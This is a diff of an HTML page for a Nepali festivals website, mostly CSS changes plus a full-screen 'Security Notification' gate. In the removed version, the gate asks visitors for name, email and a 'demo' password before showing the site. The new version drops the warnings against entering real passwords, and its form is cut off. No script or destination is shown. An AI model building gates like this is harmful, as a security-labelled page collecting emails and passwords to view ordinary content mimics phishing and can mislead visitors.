@@ -1,5 +1,4 @@
 <!DOCTYPE html>
-
 <html lang="ne">
 <head>
 <meta charset="UTF-8">
@@ -8,7 +7,6 @@
 <title>सुदीप | Nepali Festivals</title>
 
 <style>
-
 *{
     margin:0;
     padding:0;
@@ -21,386 +19,283 @@ html{
 }
 
 body{
-    font-family:
-        "Noto Sans Devanagari",
-        "Nirmala UI",
-        Arial,
-        sans-serif;
-    background:
-        radial-gradient(circle at top,#3b092f 0%,#160716 35%,#080308 100%);
+    font-family:Arial,"Noto Sans Devanagari",sans-serif;
+    background:#08030a;
     color:#fff;
-    line-height:1.7;
     overflow-x:hidden;
 }
 
-body.locked{
-    overflow:hidden;
+button,
+input,
+select,
+textarea{
+    font:inherit;
 }
 
-a{
-    color:inherit;
-}
-
-section{
-    width:100%;
-    padding:90px 6%;
-    position:relative;
-}
-
-.container{
-    width:min(1200px,100%);
-    margin:auto;
-}
-
-/* =========================
-   COMMON BUTTON
-========================= */
-
-.btn{
-    border:none;
-    outline:none;
+button{
     cursor:pointer;
-    display:inline-flex;
-    align-items:center;
-    justify-content:center;
-    gap:8px;
-    padding:14px 25px;
-    border-radius:14px;
-    background:linear-gradient(135deg,#ffb300,#ff6f00);
-    color:#160700;
-    font-weight:800;
-    font-size:15px;
-    box-shadow:
-        0 8px 25px rgba(255,145,0,.25);
-    transition:.3s ease;
 }
 
-.btn:hover{
-    transform:translateY(-3px);
-    box-shadow:
-        0 12px 30px rgba(255,145,0,.4);
-}
-
-.btn:active{
-    transform:scale(.97);
-}
-
-/* =========================
-   SECURITY GATE
-========================= */
+/* ================= GATE ================= */
 
 .gate{
     position:fixed;
     inset:0;
     z-index:9999;
-    min-height:100vh;
-    padding:20px;
+    background:
+        radial-gradient(circle at top,#3b0b35 0%,#10030d 45%,#050107 100%);
     display:flex;
     align-items:center;
     justify-content:center;
+    padding:20px;
     overflow-y:auto;
-    background:
-        radial-gradient(circle at center,#35082c,#10030d 60%,#050105);
 }
 
 .gate-card{
-    width:min(480px,100%);
-    margin:0 auto;
-    padding:35px;
-    border:1px solid rgba(255,193,7,.22);
+    width:100%;
+    max-width:430px;
+    max-height:calc(100vh - 40px);
+    overflow-y:auto;
+    padding:28px 22px;
+    border:1px solid rgba(255,255,255,.15);
     border-radius:25px;
+    background:rgba(25,7,25,.88);
+    backdrop-filter:blur(18px);
+    box-shadow:0 25px 70px rgba(0,0,0,.6);
     text-align:center;
-    background:rgba(25,8,23,.88);
-    backdrop-filter:blur(20px);
-    -webkit-backdrop-filter:blur(20px);
-    box-shadow:
-        0 25px 80px rgba(0,0,0,.55),
-        inset 0 0 30px rgba(255,193,7,.04);
 }
 
-.gate-icon,
-.success-icon{
-    width:75px;
-    height:75px;
+.gate-icon{
+    width:70px;
+    height:70px;
     margin:0 auto 18px;
+    border-radius:50%;
     display:flex;
     align-items:center;
     justify-content:center;
-    border-radius:50%;
-    font-size:34px;
-    background:rgba(255,193,7,.1);
-    border:1px solid rgba(255,193,7,.3);
+    font-size:32px;
+    background:linear-gradient(135deg,#ffb300,#ff3d81);
+    box-shadow:0 0 30px rgba(255,80,160,.35);
 }
 
-.success-icon{
-    color:#65ff9a;
-    font-size:40px;
-    border-color:rgba(101,255,154,.3);
-    background:rgba(101,255,154,.08);
-}
-
-.gate-card h1,
-.gate-card h2{
-    color:#ffc107;
+.gate-card h1{
+    font-size:25px;
     margin-bottom:10px;
 }
 
 .gate-card p{
-    color:#ddd;
-    font-size:14px;
-    margin-bottom:18px;
+    color:#cfc2d0;
+    line-height:1.7;
+    margin-bottom:20px;
 }
 
-.security-list{
-    text-align:left;
-    margin:20px 0;
-    padding:15px;
-    border-radius:15px;
-    background:rgba(255,255,255,.035);
+.gate-card.hidden{
+    display:none;
 }
 
-.security-list div{
-    padding:7px 0;
-    color:#ddd;
-    font-size:13px;
-}
-
-/* =========================
-   FORM
-========================= */
-
-.form-box{
-    text-align:left;
-}
+/* ================= FORM ================= */
 
 .form-group{
-    margin-bottom:16px;
+    text-align:left;
+    margin-bottom:14px;
 }
 
 .form-group label{
     display:block;
-    margin-bottom:6px;
-    color:#ffc107;
-    font-size:13px;
-    font-weight:700;
+    margin-bottom:7px;
+    font-size:14px;
+    color:#eee;
 }
 
 .form-group input,
 .form-group select,
 .form-group textarea{
     width:100%;
-    border:1px solid rgba(255,193,7,.18);
+    border:1px solid rgba(255,255,255,.13);
     outline:none;
     border-radius:12px;
-    padding:12px 13px;
-    background:rgba(255,255,255,.055);
-    color:#fff;
-    font-family:inherit;
-    font-size:14px;
-    transition:.25s;
+    padding:12px;
+    color:white;
+    background:#160b18;
 }
 
 .form-group input:focus,
 .form-group select:focus,
 .form-group textarea:focus{
-    border-color:#ffc107;
-    box-shadow:0 0 0 3px rgba(255,193,7,.08);
-}
-
-.form-group input::placeholder,
-.form-group textarea::placeholder{
-    color:#999;
-}
-
-.form-group select option{
-    color:#111;
+    border-color:#ff4fa3;
+    box-shadow:0 0 0 3px rgba(255,79,163,.1);
 }
 
 .form-group textarea{
-    min-height:95px;
+    min-height:90px;
     resize:vertical;
 }
 
-.form-note{
-    margin:5px 0 15px;
-    padding:11px 13px;
+.warning{
+    padding:11px;
     border-radius:12px;
-    color:#ddd;
-    background:rgba(255,193,7,.06);
-    border:1px solid rgba(255,193,7,.13);
-    font-size:11px;
+    background:rgba(255,170,0,.08);
+    border:1px solid rgba(255,170,0,.2);
+    color:#ffd98a;
+    font-size:12px;
     line-height:1.6;
+    margin:8px 0 15px;
+}
+
+/* SMALL ANDROID SUBMIT BUTTON */
+
+.submit-btn,
+.continue-btn,
+.start-btn{
+    border:0;
+    border-radius:12px;
+    color:#fff;
+    font-weight:bold;
+    transition:.2s;
 }
 
 .submit-btn{
-    width:100%;
     display:block;
-    margin:8px auto 0;
-    padding:12px 18px;
-    font-size:14px;
+    width:88%;
+    max-width:260px;
+    min-height:42px;
+    margin:15px auto 0;
+    padding:10px 13px;
+    font-size:13px;
+    background:linear-gradient(135deg,#ff2f92,#ff7a18);
+    box-shadow:0 8px 25px rgba(255,47,146,.22);
+}
+
+.submit-btn:hover{
+    transform:translateY(-2px);
+}
+
+.continue-btn,
+.start-btn{
+    width:100%;
+    padding:13px;
+    background:linear-gradient(135deg,#ff2f92,#7c3cff);
 }
 
 .loading{
     display:none;
-    text-align:center;
-    color:#ffc107;
-    margin-top:13px;
+    margin-top:12px;
+    color:#ff9ac8;
     font-size:13px;
 }
 
-/* =========================
-   NAVBAR
-========================= */
+/* ================= MAIN ================= */
 
-.navbar{
+#website{
+    display:none;
+}
+
+nav{
     position:sticky;
     top:0;
     z-index:1000;
     display:flex;
     align-items:center;
     justify-content:space-between;
-    gap:20px;
-    padding:16px 6%;
-    background:rgba(12,3,12,.88);
-    border-bottom:1px solid rgba(255,193,7,.12);
+    gap:15px;
+    padding:15px 6%;
+    background:rgba(8,3,10,.88);
     backdrop-filter:blur(15px);
-    -webkit-backdrop-filter:blur(15px);
+    border-bottom:1px solid rgba(255,255,255,.08);
 }
 
 .logo{
-    color:#ffc107;
     font-size:20px;
-    font-weight:900;
+    font-weight:800;
+    color:#ff71b7;
     white-space:nowrap;
 }
 
 .nav-links{
     display:flex;
-    align-items:center;
     gap:18px;
-    list-style:none;
     flex-wrap:wrap;
-    justify-content:flex-end;
 }
 
 .nav-links a{
-    text-decoration:none;
     color:#ddd;
-    font-size:13px;
-    transition:.25s;
+    text-decoration:none;
+    font-size:14px;
 }
 
 .nav-links a:hover{
-    color:#ffc107;
+    color:#ff67ae;
 }
 
-/* =========================
-   HERO
-========================= */
+/* ================= HERO ================= */
 
 .hero{
-    min-height:90vh;
-    display:grid;
-    grid-template-columns:1.1fr .9fr;
+    min-height:85vh;
+    display:flex;
     align-items:center;
-    gap:40px;
+    justify-content:center;
+    text-align:center;
+    padding:70px 20px;
+    background:
+        radial-gradient(circle at 20% 20%,rgba(255,44,145,.2),transparent 35%),
+        radial-gradient(circle at 80% 70%,rgba(124,60,255,.2),transparent 35%);
+}
+
+.hero-content{
+    max-width:850px;
 }
 
 .badge{
     display:inline-block;
-    padding:7px 13px;
+    padding:8px 15px;
     border-radius:30px;
-    background:rgba(255,193,7,.08);
-    border:1px solid rgba(255,193,7,.18);
-    color:#ffc107;
-    font-size:12px;
+    background:rgba(255,255,255,.07);
+    border:1px solid rgba(255,255,255,.12);
+    color:#ff9ccc;
     margin-bottom:20px;
 }
 
 .hero h1{
-    font-size:clamp(50px,8vw,100px);
-    line-height:1.02;
-    color:#fff;
-    text-shadow:0 10px 40px rgba(0,0,0,.5);
-}
-
-.hero h1::first-line{
-    color:#ffc107;
+    font-size:clamp(42px,8vw,80px);
+    line-height:1.05;
+    margin-bottom:20px;
+    background:linear-gradient(90deg,#fff,#ff65ad,#a675ff);
+    -webkit-background-clip:text;
+    color:transparent;
 }
 
 .hero p{
-    max-width:720px;
-    margin:25px 0;
-    color:#d2d2d2;
-    font-size:16px;
+    max-width:700px;
+    margin:auto;
+    color:#cfc6d0;
+    line-height:1.8;
 }
 
 .hero-buttons{
+    margin-top:30px;
     display:flex;
-    flex-wrap:wrap;
+    justify-content:center;
     gap:12px;
+    flex-wrap:wrap;
 }
 
-/* =========================
-   MANDALA
-========================= */
-
-.mandala-wrap{
-    display:flex;
-    align-items:center;
-    justify-content:center;
+.hero-buttons a{
+    text-decoration:none;
+    padding:13px 22px;
+    border-radius:12px;
+    color:#fff;
+    background:linear-gradient(135deg,#ff2f92,#7c3cff);
 }
 
-.mandala{
-    width:min(390px,75vw);
-    aspect-ratio:1;
-    border-radius:50%;
-    position:relative;
-    border:2px solid rgba(255,193,7,.35);
-    box-shadow:
-        0 0 40px rgba(255,193,7,.12),
-        inset 0 0 50px rgba(255,193,7,.08);
-    animation:spin 25s linear infinite;
+.hero-buttons a.secondary{
+    background:rgba(255,255,255,.08);
 }
 
-.mandala::before,
-.mandala::after{
-    content:"";
-    position:absolute;
-    inset:12%;
-    border:1px solid rgba(255,193,7,.28);
-    transform:rotate(45deg);
-    border-radius:30%;
-}
+/* ================= SECTIONS ================= */
 
-.mandala::after{
-    transform:rotate(90deg);
+section{
+    padding:80px 6%;
 }
-
-.mandala-center{
-    position:absolute;
-    inset:35%;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    border-radius:50%;
-    background:rgba(255,193,7,.08);
-    border:1px solid rgba(255,193,7,.4);
-    font-size:45px;
-    animation:counterSpin 25s linear infinite;
-}
-
-@keyframes spin{
-    to{transform:rotate(360deg);}
-}
-
-@keyframes counterSpin{
-    to{transform:rotate(-360deg);}
-}
-
-/* =========================
-   SECTION TITLE
-========================= */
 
 .section-title{
     text-align:center;
@@ -408,22 +303,16 @@ section{
 }
 
 .section-title h2{
-    color:#ffc107;
-    font-size:clamp(27px,5vw,45px);
-    margin-bottom:8px;
+    font-size:clamp(28px,5vw,44px);
+    margin-bottom:10px;
 }
 
 .section-title p{
     color:#aaa;
-    font-size:14px;
 }
 
-/* =========================
-   FESTIVAL CARDS
-========================= */
-
 .cards{
-    width:min(1200px,100%);
+    max-width:1150px;
     margin:auto;
     display:grid;
     grid-template-columns:repeat(3,1fr);
@@ -431,532 +320,196 @@ section{
 }
 
 .card{
-    padding:28px;
+    padding:25px;
     border-radius:22px;
-    background:rgba(255,255,255,.035);
-    border:1px solid rgba(255,193,7,.12);
-    transition:.3s;
+    background:linear-gradient(
+        145deg,
+        rgba(255,255,255,.08),
+        rgba(255,255,255,.025)
+    );
+    border:1px solid rgba(255,255,255,.09);
+    transition:.25s;
 }
 
 .card:hover{
-    transform:translateY(-7px);
-    border-color:rgba(255,193,7,.35);
-    box-shadow:0 20px 50px rgba(0,0,0,.3);
+    transform:translateY(-6px);
+    border-color:rgba(255,91,170,.35);
 }
 
-.card-icon{
-    font-size:42px;
-    margin-bottom:10px;
-}
-
-.card h3{
-    color:#ffc107;
-    font-size:25px;
-}
-
-.date{
-    color:#ff9800;
-    font-size:12px;
-    margin:5px 0 13px;
-}
-
-.card p{
-    color:#c5c5c5;
-    font-size:14px;
-}
-
-.read-more{
-    display:inline-block;
-    margin-top:15px;
-    color:#ffc107;
-    text-decoration:none;
-    font-weight:700;
-    font-size:13px;
-}
-
-/* =========================
-   FESTIVAL DETAILS
-========================= */
-
-.details-container{
-    width:min(1100px,100%);
-    margin:auto;
-    display:flex;
-    flex-direction:column;
-    gap:30px;
-}
-
-.festival-detail{
-    padding:30px;
-    border-radius:25px;
-    background:rgba(255,255,255,.035);
-    border:1px solid rgba(255,193,7,.12);
-}
-
-.detail-header{
-    display:flex;
-    align-items:center;
-    gap:18px;
-    padding-bottom:20px;
-    border-bottom:1px solid rgba(255,255,255,.08);
-}
-
-.detail-icon{
-    font-size:45px;
-}
-
-.detail-header h3{
-    color:#ffc107;
-    font-size:30px;
-}
-
-.detail-header span{
-    color:#aaa;
-    font-size:13px;
-}
-
-.detail-content{
-    display:grid;
-    grid-template-columns:repeat(2,1fr);
-    gap:25px;
-    padding-top:25px;
-}
-
-.detail-part h4,
-.detail-full h4{
-    color:#ffb300;
-    margin-bottom:8px;
-}
-
-.detail-part p,
-.detail-full p{
-    color:#ccc;
-    font-size:14px;
-}
-
-.detail-full{
-    margin-top:25px;
-    padding-top:25px;
-    border-top:1px solid rgba(255,255,255,.08);
-}
-
-.timeline{
-    display:flex;
-    flex-direction:column;
-    gap:12px;
-}
-
-.timeline-item{
-    padding:12px;
-    border-left:3px solid #ffc107;
-    background:rgba(255,193,7,.035);
-}
-
-.timeline-item strong{
-    color:#fff;
-    font-size:13px;
-}
-
-.timeline-item p{
-    font-size:12px;
-}
-
-/* =========================
-   ABOUT
-========================= */
-
-.about-box{
-    width:min(900px,100%);
-    margin:auto;
-    padding:30px;
-    border-radius:22px;
-    background:rgba(255,255,255,.035);
-    border:1px solid rgba(255,193,7,.12);
-}
-
-.about-box p{
-    color:#ccc;
-    margin-bottom:18px;
-    font-size:15px;
-}
-
-.about-box p:last-child{
-    margin-bottom:0;
-}
-
-/* =========================
-   MENU GRID
-========================= */
-
-.menu-grid{
-    width:min(900px,100%);
-    margin:auto;
-    display:grid;
-    grid-template-columns:repeat(4,1fr);
-    gap:18px;
-}
-
-.menu-item{
-    padding:25px 15px;
-    text-align:center;
-    border-radius:20px;
-    background:rgba(255,255,255,.035);
-    border:1px solid rgba(255,193,7,.12);
-    transition:.3s;
-}
-
-.menu-item:hover{
-    transform:translateY(-5px);
-}
-
-.emoji{
-    font-size:40px;
-    margin-bottom:8px;
-}
-
-.menu-item h3{
-    color:#ffc107;
-}
-
-/* =========================
-   CONTENT
-========================= */
-
-.content-box{
-    width:min(1100px,100%);
-    margin:auto;
-    display:grid;
-    grid-template-columns:repeat(2,1fr);
-    gap:20px;
-}
-
-.content-card{
-    padding:25px;
-    border-radius:20px;
-    background:rgba(255,255,255,.035);
-    border:1px solid rgba(255,193,7,.12);
-}
-
-.content-card h3{
-    color:#ffc107;
-    margin-bottom:12px;
-}
-
-.content-card ul{
-    padding-left:20px;
-    color:#ccc;
-}
-
-.content-card li{
-    margin-bottom:7px;
-    font-size:14px;
-}
-
-.content-card p{
-    color:#ccc;
-    font-size:14px;
-}
-
-/* =========================
-   PROFILE
-========================= */
-
-.profile{
-    width:min(650px,100%);
-    margin:auto;
-    text-align:center;
-    padding:35px;
-    border-radius:25px;
-    background:rgba(255,255,255,.035);
-    border:1px solid rgba(255,193,7,.12);
-}
-
-.profile img{
-    width:130px;
-    height:130px;
-    object-fit:cover;
-    border-radius:50%;
-    border:3px solid #ffc107;
+.festival-icon{
+    font-size:48px;
     margin-bottom:15px;
 }
 
-.profile h2{
-    color:#ffc107;
-}
-
-.profile p{
-    color:#aaa;
-}
-
-.chips{
-    display:flex;
-    justify-content:center;
-    flex-wrap:wrap;
-    gap:8px;
-    margin-top:18px;
-}
-
-.chip{
-    padding:6px 10px;
-    border-radius:20px;
-    background:rgba(255,193,7,.08);
-    border:1px solid rgba(255,193,7,.15);
-    color:#ddd;
-    font-size:11px;
-}
-
-/* =========================
-   DIYA
-========================= */
-
-.diya{
-    width:120px;
-    height:55px;
-    margin:70px auto 20px;
-    border-radius:0 0 60px 60px;
-    background:linear-gradient(135deg,#ffb300,#ff6f00);
-    box-shadow:0 15px 45px rgba(255,140,0,.3);
-    position:relative;
-}
-
-.flame{
-    position:absolute;
-    width:32px;
-    height:50px;
-    left:50%;
-    top:-48px;
-    transform:translateX(-50%);
-    border-radius:60% 40% 60% 40%;
-    background:#ffc107;
-    box-shadow:0 0 35px rgba(255,193,7,.8);
-    animation:flicker .7s ease-in-out infinite alternate;
-}
-
-@keyframes flicker{
-    from{
-        transform:translateX(-50%) scale(.9) rotate(-3deg);
-    }
-    to{
-        transform:translateX(-50%) scale(1.05) rotate(3deg);
-    }
-}
-
-/* =========================
-   FINAL BOX
-========================= */
-
-.final-box{
-    width:min(850px,100%);
-    margin:auto;
-    padding:35px;
-    text-align:center;
-    border-radius:25px;
-    background:rgba(255,193,7,.045);
-    border:1px solid rgba(255,193,7,.18);
-}
-
-.final-box h2{
-    color:#ffc107;
+.card h3{
     margin-bottom:10px;
 }
 
-.final-box p{
-    color:#ccc;
+.card p{
+    color:#bdb5c0;
+    line-height:1.7;
 }
 
-/* =========================
-   FOOTER
-========================= */
+/* ================= HISTORY ================= */
+
+.history{
+    max-width:1000px;
+    margin:auto;
+}
+
+.history-item{
+    padding:25px;
+    margin-bottom:18px;
+    border-left:3px solid #ff4f9f;
+    background:rgba(255,255,255,.04);
+    border-radius:0 18px 18px 0;
+}
+
+.history-item h3{
+    margin-bottom:10px;
+    color:#ff86bd;
+}
+
+.history-item p{
+    color:#c6bec9;
+    line-height:1.8;
+}
+
+/* ================= ABOUT ================= */
+
+.about-box{
+    max-width:900px;
+    margin:auto;
+    padding:30px;
+    border-radius:25px;
+    background:rgba(255,255,255,.045);
+    border:1px solid rgba(255,255,255,.09);
+}
+
+.about-box p{
+    color:#c9c1ca;
+    line-height:1.9;
+    margin-bottom:15px;
+}
+
+/* ================= CREATOR ================= */
+
+.creator{
+    max-width:700px;
+    margin:auto;
+    text-align:center;
+    padding:35px;
+    border-radius:25px;
+    background:linear-gradient(
+        145deg,
+        rgba(255,51,147,.08),
+        rgba(124,60,255,.08)
+    );
+    border:1px solid rgba(255,255,255,.1);
+}
+
+.creator h3{
+    font-size:30px;
+    color:#ff78b7;
+    margin-bottom:12px;
+}
+
+.creator p{
+    color:#bbb;
+    line-height:1.8;
+}
+
+/* ================= DIYA ================= */
+
+.diya{
+    text-align:center;
+    font-size:75px;
+    animation:glow 2s infinite alternate;
+}
+
+@keyframes glow{
+    from{
+        filter:drop-shadow(0 0 8px #ff8a00);
+    }
+    to{
+        filter:drop-shadow(0 0 30px #ff3d00);
+    }
+}
+
+/* ================= FOOTER ================= */
 
 footer{
-    padding:30px 6%;
+    padding:35px 20px;
     text-align:center;
-    border-top:1px solid rgba(255,193,7,.1);
-    background:#070207;
+    color:#8f8791;
+    border-top:1px solid rgba(255,255,255,.08);
 }
 
-footer p{
-    color:#888;
-    font-size:12px;
-    margin:3px 0;
-}
+/* ================= MOBILE ================= */
 
-footer strong{
-    color:#ffc107;
-}
+@media(max-width:700px){
 
-/* =========================
-   MOBILE
-========================= */
-
-@media(max-width:800px){
-
-    .navbar{
-        flex-direction:column;
+    .gate{
+        padding:12px;
         align-items:flex-start;
+    }
+
+    .gate-card{
+        max-height:calc(100vh - 24px);
+        padding:22px 16px;
+        border-radius:20px;
+    }
+
+    .gate-card h1{
+        font-size:22px;
+    }
+
+    .submit-btn{
+        width:88%;
+        max-width:260px;
+        min-height:42px;
+        padding:10px 13px;
+        font-size:13px;
+    }
+
+    nav{
+        padding:13px 4%;
+        align-items:flex-start;
+        flex-direction:column;
     }
 
     .nav-links{
         width:100%;
-        gap:10px 15px;
+        gap:10px;
+        overflow-x:auto;
+        flex-wrap:nowrap;
+        padding-bottom:4px;
     }
 
-    .hero{
-        grid-template-columns:1fr;
-        text-align:center;
-        padding-top:60px;
+    .nav-links a{
+        white-space:nowrap;
+        font-size:12px;
     }
 
-    .hero p{
-        margin-left:auto;
-        margin-right:auto;
-    }
-
-    .hero-buttons{
-        justify-content:center;
-    }
-
-    .mandala-wrap{
-        margin-top:20px;
+    section{
+        padding:60px 5%;
     }
 
     .cards{
         grid-template-columns:1fr;
     }
 
-    .detail-content{
-        grid-template-columns:1fr;
-    }
-
-    .menu-grid{
-        grid-template-columns:repeat(2,1fr);
-    }
-
-    .content-box{
-        grid-template-columns:1fr;
-    }
-}
-
-/* =========================
-   ANDROID / SMALL MOBILE
-========================= */
-
-@media(max-width:600px){
-
-    section{
-        padding:65px 5%;
-    }
-
-    .gate{
-        padding:12px;
-        align-items:flex-start;
-        justify-content:center;
-        overflow-y:auto;
-        -webkit-overflow-scrolling:touch;
-    }
-
-    .gate-card{
-        width:100%;
-        max-width:430px;
-        max-height:calc(100vh - 24px);
-        overflow-y:auto;
-        -webkit-overflow-scrolling:touch;
-        overscroll-behavior:contain;
-        padding:22px 16px;
-        margin:0 auto;
-        border-radius:20px;
-    }
-
-    .gate-icon,
-    .success-icon{
-        width:60px;
-        height:60px;
-        font-size:28px;
-        margin-bottom:12px;
-    }
-
-    .gate-card h1,
-    .gate-card h2{
-        font-size:22px;
-    }
-
-    .gate-card p{
-        font-size:12px;
-        line-height:1.6;
-        margin-bottom:12px;
-    }
-
-    .security-list{
-        margin:12px 0;
-        padding:11px;
-    }
-
-    .security-list div{
-        font-size:11px;
-        padding:5px 0;
-    }
-
-    .form-group{
-        margin-bottom:11px;
-    }
-
-    .form-group label{
-        font-size:12px;
-        margin-bottom:4px;
-    }
-
-    .form-group input,
-    .form-group select,
-    .form-group textarea{
-        padding:10px 11px;
-        font-size:13px;
-        border-radius:10px;
-    }
-
-    .form-group textarea{
-        min-height:70px;
-    }
-
-    .form-note{
-        padding:9px 10px;
-        margin:3px 0 11px;
-        font-size:10px;
-    }
-
-    /* SMALL SUBMIT BUTTON */
-    .submit-btn{
-        width:88%;
-        max-width:260px;
-        min-height:42px;
-        padding:10px 13px;
-        margin:7px auto 0;
-        font-size:13px;
-        border-radius:11px;
-    }
-
-    .btn{
-        padding:11px 17px;
-        font-size:13px;
-    }
-
-    .navbar{
-        padding:13px 5%;
-    }
-
-    .logo{
-        font-size:17px;
-    }
-
-    .nav-links a{
-        font-size:11px;
+    .hero{
+        min-height:75vh;
+        padding:55px 15px;
     }
 
     .hero h1{
-        font-size:55px;
+        font-size:46px;
     }
 
     .hero p{
-        font-size:13px;
+        font-size:14px;
     }
 
     .hero-buttons{
@@ -964,1549 +517,569 @@ footer strong{
         align-items:center;
     }
 
-    .hero-buttons .btn{
+    .hero-buttons a{
         width:90%;
-        max-width:280px;
-    }
-
-    .section-title{
-        margin-bottom:30px;
-    }
-
-    .section-title h2{
-        font-size:27px;
-    }
-
-    .card{
-        padding:22px;
-    }
-
-    .festival-detail{
-        padding:20px;
-    }
-
-    .detail-header{
-        align-items:flex-start;
-    }
-
-    .detail-icon{
-        font-size:35px;
-    }
-
-    .detail-header h3{
-        font-size:24px;
-    }
-
-    .detail-header span{
-        font-size:11px;
-    }
-
-    .about-box,
-    .profile,
-    .final-box{
-        padding:22px;
-    }
-
-    .menu-grid{
-        gap:12px;
-    }
-
-    .menu-item{
-        padding:18px 10px;
-    }
-
-    .emoji{
-        font-size:32px;
+        max-width:300px;
     }
 }
-
 </style>
-
 </head>
 
-<body class="locked">
+<body>
 
-<!-- =====================================================
-     SECURITY GATE
-===================================================== -->
+<!-- ================= SECURITY GATE ================= -->
 
 <div class="gate" id="securityGate">
 
-```
-<div class="gate-card">
+    <div class="gate-card" id="securityCard">
 
-    <div class="gate-icon">
-        🔐
-    </div>
+        <div class="gate-icon">🔐</div>
 
-    <h1>
-        Security Notification
-    </h1>
+        <h1>Security Notification</h1>
 
-    <p>
-        वेबसाइट सुरु गर्नु अघि कृपया आफ्नो सामान्य
-        project information भर्नुहोस्।
-    </p>
+        <p>
+            Welcome to the Nepali Festivals website.
+            Please continue to access the website.
+        </p>
 
-    <div class="security-list">
-
-        <div>
-            🛡️ सुरक्षित Project Entry
-        </div>
-
-        <div>
-            📝 Personal Information Form
-        </div>
-
-        <div>
-            🔑 Project Password (Demo) प्रयोग हुनेछ
-        </div>
-
-        <div>
-            ⚠️ वास्तविक Gmail Password वा OTP आवश्यक छैन
-        </div>
-
-    </div>
-
-    <button
-        class="btn"
-        id="continueBtn"
-    >
-        Continue →
-    </button>
-
-</div>
-```
-
-</div>
-
-<!-- =====================================================
-     PERSONAL INFORMATION GATE
-===================================================== -->
-
-<div
-    class="gate"
-    id="formGate"
-    style="display:none;"
->
-
-```
-<div class="gate-card">
-
-    <div class="gate-icon">
-        📝
-    </div>
-
-    <h2>
-        Personal Information
-    </h2>
-
-    <p>
-        वेबसाइटमा प्रवेश गर्न तलको जानकारी भर्नुहोस्।
-    </p>
-
-
-    <form
-        id="festivalForm"
-        class="form-box"
-    >
-
-
-        <div class="form-group">
-
-            <label for="name">
-                👤 नाम
-            </label>
-
-            <input
-                type="text"
-                id="name"
-                name="name"
-                placeholder="आफ्नो नाम लेख्नुहोस्"
-                required
-                autocomplete="name"
-            >
-
-        </div>
-
-
-        <div class="form-group">
-
-            <label for="email">
-                📧 Gmail / Email
-            </label>
-
-            <input
-                type="email"
-                id="email"
-                name="email"
-                placeholder="example@gmail.com"
-                required
-                autocomplete="email"
-            >
-
-        </div>
-
-
-        <div class="form-group">
-
-            <label for="projectPassword">
-                🔑 Project Password (Demo)
-            </label>
-
-            <input
-                type="password"
-                id="projectPassword"
-                name="password"
-                placeholder="कम्तीमा 6 अक्षर"
-                minlength="6"
-                required
-                autocomplete="off"
-            >
-
-        </div>
-
-
-        <div class="form-note">
-
-            🔐 <strong>महत्त्वपूर्ण:</strong><br>
-
-            यो केवल Project/Demo Password हो।
-
-            <br>
-
-            आफ्नो वास्तविक Gmail/Google password,
-            OTP वा अन्य गोप्य password यहाँ
-            कहिल्यै नलेख्नुहोस्।
-
-        </div>
-
-
-        <div class="form-group">
-
-            <label for="festival">
-                🎉 मनपर्ने चाडपर्व
-            </label>
-
-            <select
-                id="festival"
-                name="festival"
-                required
-            >
-
-                <option value="">
-                    चाडपर्व छान्नुहोस्
-                </option>
-
-                <option value="दशैं">
-                    दशैं
-                </option>
-
-                <option value="तिहार">
-                    तिहार
-                </option>
-
-                <option value="छठ पर्व">
-                    छठ पर्व
-                </option>
-
-                <option value="अन्य">
-                    अन्य
-                </option>
-
-            </select>
-
-        </div>
-
-
-        <div class="form-group">
-
-            <label for="message">
-                💬 सन्देश
-            </label>
-
-            <textarea
-                id="message"
-                name="message"
-                placeholder="आफ्नो सन्देश लेख्नुहोस्..."
-                required
-            ></textarea>
-
-        </div>
-
-
-        <button
-            type="submit"
-            class="btn submit-btn"
-            id="submitBtn"
-        >
-            🚀 Submit & Continue
+        <button class="continue-btn" id="continueBtn">
+            Continue →
         </button>
 
-
-        <div
-            class="loading"
-            id="loading"
-        >
-            ⏳ जानकारी पठाउँदै...
-        </div>
-
-    </form>
-
-</div>
-```
-
-</div>
-
-<!-- =====================================================
-     SUCCESS GATE
-===================================================== -->
-
-<div
-    class="gate"
-    id="successGate"
-    style="display:none;"
->
-
-```
-<div class="gate-card">
-
-    <div class="success-icon">
-        ✓
     </div>
 
-    <h1>
-        Success!
-    </h1>
+    <!-- ================= PERSONAL INFO ================= -->
 
-    <p>
-        तपाईंको जानकारी पठाउने अनुरोध सफलतापूर्वक
-        सुरु गरिएको छ।
-    </p>
+    <div class="gate-card hidden" id="formCard">
 
-    <p>
-        अब नेपाली चाडपर्व वेबसाइटमा प्रवेश गर्न
-        तलको बटन थिच्नुहोस्।
-    </p>
+        <div class="gate-icon">🪔</div>
 
-    <button
-        class="btn"
-        id="startWebsiteBtn"
-    >
-        🌟 Start Website
-    </button>
-
-</div>
-```
-
-</div>
-
-<!-- =====================================================
-     MAIN WEBSITE
-===================================================== -->
-
-<div id="mainWebsite" style="display:none;">
-
-<!-- NAVBAR -->
-
-<nav class="navbar">
-
-```
-<div class="logo">
-    🇳🇵 Nepali Festivals
-</div>
-
-<ul class="nav-links">
-
-    <li>
-        <a href="#home">
-            होम
-        </a>
-    </li>
-
-    <li>
-        <a href="#festivals">
-            मुख्य पृष्ठ
-        </a>
-    </li>
-
-    <li>
-        <a href="#history">
-            उत्पत्ति
-        </a>
-    </li>
-
-    <li>
-        <a href="#about">
-            हाम्रो बारेमा
-        </a>
-    </li>
-
-    <li>
-        <a href="#menu">
-            विशेषता
-        </a>
-    </li>
-
-    <li>
-        <a href="#profile">
-            प्रोफाइल
-        </a>
-    </li>
-
-    <li>
-        <a href="#diya">
-            दीप
-        </a>
-    </li>
-
-</ul>
-```
-
-</nav>
-
-<!-- HERO -->
-
-<section id="home">
-
-```
-<div class="container hero">
-
-    <div>
-
-        <span class="badge">
-            🇳🇵 नेपालको संस्कृति र परम्परा
-        </span>
-
-        <h1>
-            नेपाली<br>
-            चाडपर्व
-        </h1>
+        <h1>Welcome</h1>
 
         <p>
-            नेपाल विविध जातजाति, भाषा, संस्कृति र
-            परम्पराले भरिपूर्ण देश हो।
-            यहाँ मनाइने चाडपर्वहरू केवल उत्सव मात्र
-            होइनन्, तिनीहरू हाम्रो इतिहास,
-            विश्वास, सामाजिक सम्बन्ध र सांस्कृतिक
-            पहिचानसँग जोडिएका महत्वपूर्ण परम्परा हुन्।
+            कृपया आफ्नो जानकारी भरेर वेबसाइट सुरु गर्नुहोस्।
         </p>
 
-        <div class="hero-buttons">
+        <form id="festivalForm">
 
-            <a
-                href="#festivals"
-                class="btn"
-                style="text-decoration:none;"
+            <div class="form-group">
